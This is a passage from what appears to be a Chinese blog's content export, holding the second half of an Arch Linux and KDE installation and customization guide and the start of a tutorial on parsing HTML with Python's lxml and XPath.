http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.nju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.nju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirror.redrock.team&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirror.redrock.team&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.sjtug.sjtu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.xjtu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br></pre></td></tr></table></figure>
<p>更新一下源看看命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -Syy</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213143005196.png" alt="image-20210213143005196"></p>
<h2 id="必须包安装-1"><a href="#必须包安装-1" class="headerlink" title="必须包安装"></a>必须包安装</h2><p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt/ base linux  linux-firmware </span><br></pre></td></tr></table></figure>
<p>安装可能要点时间</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213144647740.png" alt="image-20210213144647740"></p>
<h2 id="生成创建fstab文件-1"><a href="#生成创建fstab文件-1" class="headerlink" title="生成创建fstab文件"></a>生成创建fstab文件</h2><div class="note info simple"><p>fstab是非常重要的一个文件，当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录</p>
</div>

<p>分别使用<code>-U</code>或<code>-L</code>定义<a href="https://wiki.archlinux.org/index.php/UUID">UUID</a>或标签</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213145159513.png" alt="image-20210213145159513"> </p>
<p>查看一下他的内容</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213145222289.png" alt="image-20210213145222289"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Static information about the filesystems.</span><br><span class="line"># See fstab(5) for details.</span><br><span class="line"></span><br><span class="line"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span><br><span class="line"># &#x2F;dev&#x2F;sda3</span><br><span class="line">UUID&#x3D;01f973b0-f6af-4498-ac68-e05ff66c8896       &#x2F;               ext4            rw,relatime     0 1</span><br><span class="line"></span><br><span class="line"># &#x2F;dev&#x2F;sda1</span><br><span class="line">UUID&#x3D;584b928e-591c-44ed-827b-4f42003a1a29       &#x2F;boot           ext2            rw,relatime     0 2</span><br><span class="line"></span><br><span class="line"># &#x2F;dev&#x2F;sda2</span><br><span class="line">UUID&#x3D;b1fb0e39-31e9-49ff-9fd8-31531d492549       none            swap            defaults        0 0</span><br></pre></td></tr></table></figure>

<h2 id="系统配置-1"><a href="#系统配置-1" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="切换到新系统-1"><a href="#切换到新系统-1" class="headerlink" title="切换到新系统"></a>切换到新系统</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>
<p>可以看见到了新系统里面</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213145823307.png" alt="image-20210213145823307"></p>
<h3 id="基本的工具安装-1"><a href="#基本的工具安装-1" class="headerlink" title="基本的工具安装"></a>基本的工具安装</h3><p><strong>下面的东西都是很重要的比如基本的命令ifconfig就是net-tools包，连接网线dhcpcd，声音输入输出alsa-utils等等</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S  vim bash-completion  pulseaudio pulseaudio-alsa  networkmanager sudo dhcpcd net-tools alsa-utils openssh</span><br></pre></td></tr></table></figure>
<p>设置开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable dhcpcd</span><br><span class="line">systemctl enable NetworkManager</span><br></pre></td></tr></table></figure>


<h3 id="设置时区-1"><a href="#设置时区-1" class="headerlink" title="设置时区"></a>设置时区</h3><p>可以在这个地址查看自己的市区访问一下就可以了<a href="https://ipapi.co/">https://ipapi.co/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213150751471.png" alt="image-20210213150751471"></p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;地区&#x2F;城市 &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure>
<p>我输入的是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure>
<p>然后设置硬件时钟</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213151033632.png" alt="image-20210213151033632"></p>
<h3 id="设置系统语言-1"><a href="#设置系统语言-1" class="headerlink" title="设置系统语言"></a>设置系统语言</h3><p>语言配置在<code>/etc/locale.gen</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;locale.gen</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>叫这个<code>es_US.UTF-8 UTF-8</code>注释去掉</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213151608543.png" alt="image-20210213151608543"></p>
<div class="note info simple"><p>这个<code>locale-gen</code>命令生成语言环境</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213151947887.png" alt="image-20210213151947887"></p>
<div class="note info simple"><p>语言环境配置文件，文件在<code>/etc/locale.conf</code>，写入<code>LANG=en_US.UTF-8</code></p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213152341325.png" alt="image-20210213152341325"></p>
<h3 id="设置键盘布局-1"><a href="#设置键盘布局-1" class="headerlink" title="设置键盘布局"></a>设置键盘布局</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;vconsole.conf</span><br></pre></td></tr></table></figure>
<p>内容，这个我也不太知道我就不改了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEYMAP&#x3D;键盘布局名字</span><br></pre></td></tr></table></figure>
<h3 id="root密码-1"><a href="#root密码-1" class="headerlink" title="root密码"></a>root密码</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213154442653.png" alt="image-20210213154442653"></p>
<h2 id="网络配置-3"><a href="#网络配置-3" class="headerlink" title="网络配置"></a>网络配置</h2><h3 id="设置网络主机名-1"><a href="#设置网络主机名-1" class="headerlink" title="设置网络主机名"></a>设置网络主机名</h3><p>文件在<code>/etc/hostname</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hostname</span><br></pre></td></tr></table></figure>
<p>我的文件内容zss</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213153756918.png" alt="image-20210213153756918"></p>
<h3 id="网络配置-4"><a href="#网络配置-4" class="headerlink" title="网络配置"></a>网络配置</h3><p>文件在<code>/etc/hosts</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
<p>打开是这样的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213154101678.png" alt="image-20210213154101678"></p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	主机名.localdomain	主机名</span><br></pre></td></tr></table></figure>
<p>我的配置</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213154226226.png" alt="image-20210213154226226"></p>
<h2 id="安装微代码-1"><a href="#安装微代码-1" class="headerlink" title="安装微代码"></a>安装微代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S intel-ucode</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213155519502.png" alt="image-20210213155519502"></p>
<h2 id="安装引导和配置-1"><a href="#安装引导和配置-1" class="headerlink" title="安装引导和配置"></a>安装引导和配置</h2><p>安装grub</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr  os-prober</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>这个引导那其他引导也一样，设置引导</p>
</div>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot/efi --removable</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<h2 id="添加用户和权限-1"><a href="#添加用户和权限-1" class="headerlink" title="添加用户和权限"></a>添加用户和权限</h2><h3 id="添加用户-1"><a href="#添加用户-1" class="headerlink" title="添加用户"></a>添加用户</h3><div class="note info simple"><p>useradd命令是创建用户用的下面的意思是叫zss用户添加到wheel组里面</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel zss</span><br></pre></td></tr></table></figure>
<h3 id="给与权限-1"><a href="#给与权限-1" class="headerlink" title="给与权限"></a>给与权限</h3><p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">EDITOR=vim visudo</span><br></pre></td></tr></table></figure>
<p>叫这个注释去掉</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210213183354671.png" alt="image-20210213183354671"></p>
<h3 id="设置密码-1"><a href="#设置密码-1" class="headerlink" title="设置密码"></a>设置密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd 用户名</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213183800585.png" alt="image-20210213183800585"></p>
<h2 id="基本系统安装完-1"><a href="#基本系统安装完-1" class="headerlink" title="基本系统安装完"></a>基本系统安装完</h2><div class="note info simple"><p>退出</p>
</div>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213160959765.png" alt="image-20210213160959765"></p>
<div class="note info simple"><p>取消挂载</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount -R &#x2F;mnt</span><br></pre></td></tr></table></figure>

<div class="note info simple"><p>重启</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>可以看见安装好了</p>
<h1 id="安装桌面环境kde"><a href="#安装桌面环境kde" class="headerlink" title="安装桌面环境kde"></a>安装桌面环境kde</h1><h2 id="安装xorg"><a href="#安装xorg" class="headerlink" title="安装xorg"></a>安装xorg</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S xorg   </span><br></pre></td></tr></table></figure>
<h2 id="安装登录管理器"><a href="#安装登录管理器" class="headerlink" title="安装登录管理器"></a>安装登录管理器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S  sddm sddm-kcm </span><br></pre></td></tr></table></figure>
<p>下面设置开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable sddm</span><br></pre></td></tr></table></figure>
<h2 id="安装kde"><a href="#安装kde" class="headerlink" title="安装kde"></a>安装kde</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S plasma kde-applications </span><br></pre></td></tr></table></figure>
<p>可以看见文件很大</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213204433729.png" alt="image-20210213204433729"></p>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>可以看见就有界面了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213184319553.png" alt="image-20210213184319553"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213212514860.png" alt="image-20210213212514860"></p>
<h1 id="arch配置和kde美化"><a href="#arch配置和kde美化" class="headerlink" title="arch配置和kde美化"></a>arch配置和kde美化</h1><h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h2><div class="note info simple"><p>打开设置</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316192216892.png" alt="image-20210316192216892"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316192305220.png" alt="image-20210316192305220"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316192323690.png" alt="image-20210316192323690"></p>
<p>叫中文放到最上面</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316192357366.png" alt="image-20210316192357366"></p>
<p>注销或者重启一下就可以了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316192459681.png" alt="image-20210316192459681"></p>
<h2 id="登录美化"><a href="#登录美化" class="headerlink" title="登录美化"></a>登录美化</h2><p>你就可以安装自己喜欢的了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316193814322.png" alt="image-20210316193814322"></p>
<h2 id="字体安装"><a href="#字体安装" class="headerlink" title="字体安装"></a>字体安装</h2> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S  ttf-dejavu wqy-bitmapfont wqy-microhei wqy-zenhei noto-fonts noto-fonts-emoji </span><br></pre></td></tr></table></figure>


<h2 id="输入法安装"><a href="#输入法安装" class="headerlink" title="输入法安装"></a>输入法安装</h2><h3 id="安装-fcitx"><a href="#安装-fcitx" class="headerlink" title="安装 fcitx"></a>安装 fcitx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx fcitx-qt5 fcitx-configtool</span><br></pre></td></tr></table></figure>
<h3 id="安装谷歌输入法"><a href="#安装谷歌输入法" class="headerlink" title="安装谷歌输入法"></a>安装谷歌输入法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-googlepinyin </span><br></pre></td></tr></table></figure>
<p>###　设置</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316204343497.png" alt="image-20210316204343497"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316204427201.png" alt="image-20210316204427201"></p>
<p>切换输入法的快捷键</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316204452798.png" alt="image-20210316204452798"></p>
<p>可以看见就可以输入中文了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316204548769.png" alt="image-20210316204548769"></p>
<h2 id="基本软件安装"><a href="#基本软件安装" class="headerlink" title="基本软件安装"></a>基本软件安装</h2><p>火狐浏览器安装包名字<code>firefox-i18n-zh-cn</code></p>
<p>网易云安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S dpkg</span><br><span class="line">dpkg -i 下载的安装包</span><br></pre></td></tr></table></figure>
<p>视频播放器软件名字<code>mpv</code></p>
<p>截图工具软件名字<code>flameshot</code></p>
<p>obs录屏软件软件名字<code>obs-studio  </code></p>
<h2 id="latte-dock安装"><a href="#latte-dock安装" class="headerlink" title="latte-dock安装"></a>latte-dock安装</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S  latte-dock</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316195412539.png" alt="image-20210316195412539"></p>
<h2 id="Plasma样式美化"><a href="#Plasma样式美化" class="headerlink" title="Plasma样式美化"></a>Plasma样式美化</h2><p>我用的是<code>WhiteSur-alt </code></p>
<p>你们可以去下载</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210316205800488.png" alt="image-20210316205800488"></p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><ol>
<li><p><code>panon</code>有声音就会动的一个插件</p>
<p>他依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S qt5-websockets python-docopt python-numpy python-pyaudio python-cffi python-websockets libpackagekit-glib</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317082623220.png" alt="image-20210317082623220"></p>
</li>
<li><p><code>Netspeed</code>流量监控</p>
<p><img src= "/img/loading2.gif" data-lazy-src="/home/zss/.config/Typora/typora-user-images/image-20210317083316061.png" alt="image-20210317083316061"></p>
</li>
<li><p><code>Reversal</code>小米图标</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317083508762.png" alt="image-20210317083508762"></p>
</li>
<li><p><code>System load </code>系统监控</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317083923950.png" alt="image-20210317083923950"></p>
</li>
<li><p><code>Monitor</code>桌面系统监控</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317084511296.png" alt="image-20210317084511296"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317084536275.png" alt="image-20210317084536275"></p>
<ol start="6">
<li><p><code>Layan</code>光标</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317092435050.png" alt="image-20210317092435050"></p>
</li>
<li><p><code>cherry</code>窗口装饰</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317092747242.png" alt="image-20210317092747242"></p>
</li>
<li><p><code>Evergarden</code>欢迎界面</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210317092942561.png" alt="image-20210317092942561"></p>
</li>
</ol>
</li>
</ol>
<h2 id="显卡驱动安装"><a href="#显卡驱动安装" class="headerlink" title="显卡驱动安装"></a>显卡驱动安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nvidia nvidia-prime nvidia-settings nvidia-utils opencl-nvidia lib32-nvidia-utils lib32-opencl-nvidia</span><br></pre></td></tr></table></figure>
<h1 id="我的KDE配置文件地址"><a href="#我的KDE配置文件地址" class="headerlink" title="我的KDE配置文件地址"></a>我的KDE配置文件地址</h1>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>lxml解析库用XPath语言提取数据</title>
    <url>/2021/08/24/lxml/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>学习总结</p>
<p>书名《Python3 网络爬虫开发实战》</p>
<p>学习视频地址地址<a href="https://www.bilibili.com/video/BV1n7411m7BR">https://www.bilibili.com/video/BV1n7411m7BR</a></p>
</div>

<div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>lxml解析是用c语音编写的他解析XPath语言所以他的解析速度</p>
</div>

<div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>为什么要用到lxml解析库，我们在请求响应回来的数据他只是一个html的字符串，lxml就是把html或xml的字符串解析成html或xml的页面</p>
<p>lxml解析就是<code>html/xml</code>解析器</p>
</div>

<h1 id="解析html-xml的页面"><a href="#解析html-xml的页面" class="headerlink" title="解析html/xml的页面"></a>解析html/xml的页面</h1><h2 id="html字符串解析"><a href="#html字符串解析" class="headerlink" title="html字符串解析"></a>html字符串解析</h2><div class="note info simple"><p>我们在请求响应回来的数据他只是一个html的字符串，lxml就是把html或xml的字符串解析成html或xml的页面</p>
<p>lxml库有一个etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt;  </span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> <span class="comment"># 上面li 节点是没有闭合的，但是 etree 模块可以自动修正 HTML 文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>
<p>结果，他是一个html的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Element html at 0x7f1287333f40&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210823104956877.png" alt="image-20210823104956877"></p>
<div class="note info simple"><p>可以看见他被解析成了一个<code>html</code>对象我们可以用<code>lxml</code>解析库的<code>tostring()</code> 方法即可输出修正后的 HTML 代码</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt; </span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> <span class="comment"># 上面li 节点是没有闭合的，但是 etree 模块可以自动修正 HTML 文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  tostring() 方法即可输出修正后的 HTML 代码，叫转换后的html对象给解析成可以看懂的</span></span><br><span class="line">result = etree.tostring(html)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br><span class="line"><span class="comment"># 输出他的类型</span></span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure>
<p>结果，但是结果是 <code>bytes</code> 类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#39;&lt;html&gt;&lt;body&gt;&lt;div&gt;\n    &lt;ul&gt;\n         &lt;li class&#x3D;&quot;item-0&quot;&gt;&lt;a href&#x3D;&quot;link1.html&quot;&gt;first item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n         &lt;li class&#x3D;&quot;item-1&quot;&gt;&lt;a href&#x3D;&quot;link2.html&quot;&gt;second item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n         &lt;li class&#x3D;&quot;item-inactive&quot;&gt;&lt;a href&#x3D;&quot;link3.html&quot;&gt;third item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n         &lt;li class&#x3D;&quot;item-1&quot;&gt;&lt;a href&#x3D;&quot;link4.html&quot;&gt;fourth item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n         &lt;li class&#x3D;&quot;item-0&quot;&gt;&lt;a href&#x3D;&quot;link5.html&quot;&gt;&amp;#29228;&amp;#34411;&lt;&#x2F;a&gt; \n     &lt;&#x2F;li&gt;&lt;&#x2F;ul&gt;\n &lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39;</span><br><span class="line">&lt;class &#39;bytes&#39;&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824121223642.png" alt="image-20210824121223642"></p>
<div class="note info simple"><p>上面的结果是 <code>bytes</code> 类型，利用 <code>decode()</code> 方法将其转成 <code>str</code> 类型</p>
</div>

